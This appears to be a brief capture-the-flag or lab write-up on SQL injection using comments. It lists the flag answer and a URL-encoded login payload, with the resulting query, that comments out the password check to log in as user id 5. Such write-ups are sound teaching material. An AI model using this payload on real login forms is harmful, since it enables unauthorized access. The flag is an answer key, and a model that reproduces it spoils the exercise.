# Using Comments
## Questions
1. Login as the user with the id 5 to get the flag. **Answer: cdad9ecdf6f14b45ff5c4de32909caec**
   - Login with this payload: `username=abc%27+or+id+%3D+5%29+--+&password=123` → Resulting query: `SELECT * FROM logins WHERE (username='abc' or id = 5) -- ' AND id > 1) AND password = '202cb962ac59075b964b07152d234b70';`